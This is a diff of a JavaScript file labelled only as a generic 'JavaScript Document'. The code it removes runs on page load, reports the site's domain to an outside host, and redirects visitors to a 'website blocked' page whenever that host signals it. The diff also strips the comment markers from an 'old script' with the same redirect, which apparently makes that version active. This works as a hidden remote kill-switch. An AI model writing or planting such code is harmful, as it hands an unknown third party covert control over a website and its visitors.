@@ -1,42 +1,4 @@
-// JavaScript Document
 
-jQuery(this).load(function(){
-
-var client = window.location.protocol + "//" + window.location.host + "/";
-
-var request_url = "http://rajeevvishva.byethost10.com/index.php?domain="+client+"&inaction=1";
-var popwindwourl = "http://websiteblocked.22web.org/"
-
-
-
-jQuery.ajax({
-        url: request_url,
-        success: function(result) {
-            html = jQuery('<div>').html(result);
-
-       
-            var result = html.find("div#results").html();
-			if(result == 1)
-			{
-				var newWin = window.open(popwindwourl, "popupWindow", "width=1200, height=800, scrollbars=yes");
-                if(!newWin || newWin.closed || typeof newWin.closed=='undefined') 
-					{ 
-						window.location=popwindwourl;
-					}
-	
-			}
-         
-
-        },
-    });
-	
-	
-
-
-});
-
-/*
-old script
 
 jQuery(this).load(function(){
 
@@ -166,4 +128,4 @@ window.location="http://websiteblocked.22web.org/";
 
 });
 
-*/
+
